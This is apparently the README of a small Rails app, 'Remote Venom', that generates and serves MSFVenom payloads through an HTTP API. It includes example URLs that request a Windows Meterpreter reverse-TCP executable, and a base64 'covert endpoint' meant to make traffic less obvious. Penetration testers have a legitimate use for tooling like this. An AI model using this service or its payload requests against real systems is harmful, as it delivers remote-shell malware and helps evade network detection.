# Remote Venom
---
This is a simple Rails app acting as a remote delivery system for MSFVenom payloads. 

To install:
```
bundle install
rake db:create
rake db:schema:load
```

To run:
```
rails s -b 0.0.0.0
```

Every MSFVenom option has been parameterized, so calls to the API look like this:
```
http://192.168.1.100:3000/api/payloads?payload=windows/meterpreter/reverse_tcp&lhost=HOST&lport=PORT&format=exe
```
You can also use the shorthand syntax:
```
http://192.168.1.100:3000/api/payloads?p=windows/meterpreter/reverse_tcp&lhost=HOST&lport=PORT&f=exe
```
For less obvious traffic, you can send the parameters as base64 (using the covert endpoint):
```
http://192.168.1.100:3000/a?b=cD13aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfdGNwJmxob3N0PUhPU1QmbHBvcnQ9UE9SVCZmPWV4ZQo=
# example encoded payload is 'p=windows/meterpreter/reverse_tcp&lhost=HOST&lport=PORT&f=exe'
```
To list all payloads:
```
http://192.168.1.100:3000/api/payloads/list
or 
http://192.168.1.100:3000/a/p/l
```

Feel free to use and modify, or contribute directly to the project. Merge requests welcome!
